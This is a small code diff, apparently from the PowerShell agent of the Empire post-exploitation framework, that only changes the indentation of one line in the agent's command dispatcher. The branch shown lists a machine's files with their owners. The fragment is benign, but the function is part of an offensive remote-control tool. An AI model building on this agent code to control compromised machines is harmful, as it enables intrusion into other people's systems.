@@ -279,7 +279,7 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
-               '(ls|^dir)' {
+                '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
                         $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
